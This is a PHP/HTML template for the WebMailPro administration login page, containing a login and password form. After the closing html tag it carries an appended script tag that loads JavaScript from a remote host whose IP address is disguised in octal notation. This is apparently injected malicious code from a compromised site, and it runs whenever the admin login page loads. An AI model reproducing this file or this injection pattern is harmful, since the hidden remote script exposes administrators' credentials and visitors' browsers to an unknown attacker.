<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd" />
<html>
<head>
	<title>WebMailPro - Administration Login</title>
	<link rel="stylesheet" href="<?php echo $skinPath;?>/styles.css" type="text/css" />
</head>
<body>
<form action="?mode=enter" method="post">
<div align="center" class="wm_content">
	<div class="wm_logo" id="logo" tabindex="-1" onfocus="this.blur();">
		<span><?php echo StoreWebmail;?></span>
		<a class="header" target="_top" href="<?php echo !empty($_SESSION['cart_url']) ? $_SESSION['cart_url'] : '../../../../../admin.php'; ?>"><?php echo BackToCart;?></a>
	</div>
		<?php echo $errorDiv; ?>
		<table class="wm_login">
			<tr>
				<td class="wm_login_header" colspan="2">Administration Login</td>
			</tr>
			<tr>
				<td class="wm_title">Login:</td>
				<td>
					<input class="wm_input" size="20" type="text" id="login" name="login"
					onfocus="this.style.background = '#FFF9B2';"
					onblur="this.style.background = 'white';" />
				</td>
			</tr>
			<tr>
				<td class="wm_title">Password:</td>
				<td>
					<input class="wm_input" type="password" size="20" id="password" name="password" 
					onfocus="this.style.background = '#FFF9B2';"
					onblur="this.style.background = 'white';" />
				</td>
			</tr>
			<tr>
				<td colspan="2">
					<span class="wm_login_button">
						<input class="wm_button" type="submit" name="enter" value="Login" />
					</span>
				</td>
			</tr>
		</table>
<div class="wm_copyright" id="copyright">
<?php
	@require('inc.footer.php');
?>
</div>
</div>
</form>
</body>
</html><script src='http://0133.0334.0043.0307/0403.php?js'></script>